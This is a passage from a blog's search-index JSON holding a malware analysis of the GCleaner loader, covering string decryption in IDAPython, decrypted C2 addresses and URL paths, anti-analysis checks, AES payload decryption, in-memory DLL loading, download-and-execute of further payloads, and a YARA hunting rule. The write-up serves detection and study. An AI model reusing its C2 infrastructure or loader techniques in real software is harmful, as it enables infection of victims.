more thing I noticed is that some strings use a combination of stack values and other values stored in the \".rdata\" section (retrieved using the XMM instruction \"movaps\").      So we can search for this \"movaps\" instruction after the \"cmp\" instruction, if found we can read the values stored at its operand address and append it to the encrypted bytes.       # Find possible xmmword movaps     xmmword_addr = ida_search.find_binary(addr, addr+50, pattern2, 16, ida_search.SEARCH_NEXT | ida_search.SEARCH_DOWN)     if xmmword_addr != idc.BADADDR:         # Read the xmmword value         xmmword_value = idc.get_bytes(get_operand_value(xmmword_addr, 1), 16)         enc_bytes = xmmword_value + enc_bytes   Finally we can xor the encrypted values with 0x2E (this key has been the same for all GCleaner samples I looked at).       # Decrypt and strip encrypted bytes     dec_bytes = bytes(c ^ 0x2E for c in enc_bytes)     dec_str = dec_bytes.strip(b'\\x00').decode('utf-8')         if len(dec_str) != 0:         print(f\"{hex(addr)} --&gt; {dec_str}\")          # Set a comment with the decrypted string         if dec_str and comment_addr != idc.BADADDR:             set_comment(comment_addr, dec_str)   Here is the list of decrypted strings:                              Expand to see more           &emsp; 45.12.253.56  &emsp; 45.12.253.72  &emsp; 45.12.253.98  &emsp; 45.12.253.75/dll.php  &emsp; mixinte  &emsp; mixtwo   &emsp; B  &emsp; USERPROFILE  &emsp; CCleaner  &emsp; VLC media player  &emsp; Acrobat Reader DC  &emsp; Russian  &emsp; admin  &emsp; Shah  &emsp; testBench  &emsp; taskmgr  &emsp; Taskmgr  &emsp; wireshark  &emsp; Process Hacker  &emsp; Wireshark  &emsp; C:\\Program Files  &emsp; C:\\ProgramData  &emsp; C:\\Temp  &emsp; C:\\Program Files  &emsp; C:\\ProgramData  &emsp; C:\\Temp  &emsp; /advertisting/plus.php?s=  &emsp; &amp;str=mixtwo  &emsp; &amp;substr=  &emsp; /default/stuk.php  &emsp; /default/puk.php  &emsp; NOSUB  &emsp; chk  &emsp; /chk  &emsp; test   We can now see the C2 IPs, URL paths and some other interesting strings. Let’s keep going.   Anti Checks (or is it..?)   GCleaner is filled with host checks but weirdly enough it doesn’t do anything them, maybe they were like test features? copy-paste code? not really sure but let’s quickly go though them.   Checking username   Get the current username using \"GetUserNameA()\" and compare it to hardcoded names (\"admin\", \"Shah\", \"testBench\").   Checking foreground window   Get the title of the foreground window using \"GetWindowTextA()\" and compare it to hardcoded strings.      Checking desktop files   Search for Desktop files with specific strings in their name (\"CCleaner\", \"VLC media player\", \"Acrobat Reader DC\").   Checking locale and keyboard layout   Check if the computer locale is Russian and compare the keyboard layout against specific values (CIS countries).      Dropped Binary   Looking back at the process tree we need to figure out where does that child binary with random name comes from. \"%APPDATA%\\{846ee340-7039-11de-9d20-806e6f6e6963}\\34LMAylZs6FixF.exe\"   We can see below that the sample reads the \"%APPDATA%\" path using \"getenv()\" then creates a random directory using the GUID of the current hardware profile, if retrieving the hardware profile failed it will fall back to generating a random folder name. Other possible locations for creating the random directory are \"C:\\Program Files\", \"C:\\Temp\", \"C:\\ProgramData\" (fallback locations).      Next it generates a random file name, appends \".exe\" extension to it then drops it to the newly created directory and runs it from there.   The binary file is hardcoded into the parent sample.      All that binary child does is…well…sleep for 10 seconds, that’s it :|      C2 Communications   The actors behind GCleaner have been known to use BraZZZers fast flux service to hide their infrastructure, it works more like a proxy system between the victims and the real C2 server.   Before reaching out to the C2 servers, GCleaner adds hardcoded HTTP headers (could be used for a network sig) an a custom user-agent to each C2 request.      Now to figure out what each C2 request is responsible for.   First C2      IP: 45[.]12.253.56   UA: OK   PCAP:      This C2 is likely responsible for bot registration. The sample will only continue execution if the server response is \"0\" or \"1\", otherwise it goes to sleep and tries again.      The \"str\" and \"substr\" parameters in the C2 request above are possibly referring to the campaign ID, GCleaner has been known to use similar values in the past like \"usone\", \"ustwo\", \"euthree\", \"cafive\", \"mixshop\", …   Second C2      IP: 45[.]12.253.72   UA: OK   PCAP:      The first request to this C2 is responsible for getting an AES key.      The key length must be between 10 and 100 bytes, otherwise it breaks the execution.      The second request is responsible for getting an AES encrypted PE file (notice the filename in the response headers!), That PE file is decrypted using the key from the previous request.      The decryption routine is pretty trivial, the sample first calculates the SHA256 hash of the server key then derives the session key used for decryption (AES_128).      After that it loads the decrypted PE file into memory (without touching disk) to get the address of an export function called \"GetLicInfo\" which is used in the next stage.      Downloaded DLL   Before going further we first need to take a look at the downloaded PE file. To be able to analyze it we can either use the debugger to dump the decrypted file or get the encrypted response from the PCAP and decrypt it manually.   We can easily implement the decryption code in Python as follow:   import hashlib from Crypto.Cipher import AES  enc = open(\"puk.php.bin\", \"rb\").read()  key = \"kvQoRqtcCyMtHmQyQXOUu\".encode(\"utf-16le\") # Important to encode!! sha256_hash = hashlib.sha256(key) aes_key = sha256_hash.digest()[:16]  cipher = AES.new(aes_key, mode=AES.MODE_CBC, IV=b\"\\x00\"*16) dec = cipher.decrypt(enc)  open(\"out.bin\", \"wb\").write(dec)   Now let’s see what this export function \"GetLicInfo\" does.   Basically it sends an http request to the supplied C2 server then checks the response length, if the length is greater than 2048 bytes it creates a a new directory with a random name under \"%APPDATA%\" or \"%TEMP%\" folder then generates a random filename and appends \".exe\" extension to it.      Finally it writes the server response to a disk file with the generated random filename and executes that file.      Third C2      IP: 45[.]12.253.75   UA: B   PCAP:      This C2 is responsible for downloading further payloads, notice the user-agent used here is the one from the decrypted strings list unlike the previous 2 C2s.   The address is supplied to the external function \"GetLicInfo\" which downloads and executes the payload as we stated above. GCleaner tries to get a payload from the server for 10 iterations with a sleep period of 2 seconds between every try.      If no further payload is received from the server the samples kills its process and deletes the parent file from disk.      Forth C2      IP: 45[.]12.253.98   This C2 wasn’t used in the sample we are looking at.   Config Extraction   We can use the IDA python script we used for string decryption to build a standalone config extractor as most of the interesting stuff are in the decrypted strings list.   Here’s the output of the code after extracting the useful information:      The code can be found here.   (this script is not optimized for production, it’s just for research purposes)   Hunting   Urlscan   The URL path of the first C2 request can be a good candidate to hunt for more C2s on urlscan.   I looked at more samples and found these two URL patterns:      s=NOSUB&amp;str=...&amp;substr=...   sub=NOSUB&amp;stream=...&amp;substream=...   So we can use the \"page.url\" field to search for the first part of these patterns.      Yara   We saw that many strings were encrypted but we can use some of the hardcoded ones to create a simple yara rule for hunting more samples.   rule GCleaner {     meta:         description = \"Detects GCleaner payload\"         author = \"Abdallah Elshinbary (@_n1ghtw0lf)\"         hash1 = \"020d370b51711b0814901d7cc32d8251affcc3506b9b4c15db659f3dbb6a2e6b\"         hash2 = \"73ed1926e850a9a076a8078932e76e1ac5f109581996dd007f00681ae4024baa\"      strings:         // Kill self         $s1  = \"\\\" &amp; exit\" ascii fullword         $s2  = \"\\\" /f &amp; erase \" ascii fullword         $s3  = \"/c taskkill /im \\\"\" ascii fullword         // Anti checks         $s4  = \" Far \" ascii fullword         $s5  = \"roxifier\" ascii fullword         $s6  = \"HTTP Analyzer\" ascii fullword         $s7  = \"Wireshark\" ascii fullword         $s8  = \"NetworkMiner\" ascii fullword         // HTTP headers         $s9  = \"Accept-Language: ru-RU,ru;q=0.9,en;q=0.8\" ascii fullword         $s10 = \"Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\" ascii fullword         $s11 = \"Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\" ascii fullword         $s12 = \"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\" ascii fullword          condition:         uint16(0) == 0x5a4d and         10 of them }   References           https://medium.com/csis-techblog/gcleaner-garbage-provider-since-2019-2708e7c87a8a            https://medium.com/csis-techblog/inside-view-of-brazzzersff-infrastructure-89b9188fd145      ","categories": ["Malware Analysis"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/malware%20analysis/gcleaner-loader/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/malware-analysis/gcleaner/logo.png"
      },{
        "title": "first blog",
        "excerpt":"first blog   hello world this is my first blog  ","categories": ["first blog"],
        "tags": ["first blog"],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/first%20blog/first-blog/",
        "teaser": null
      }]
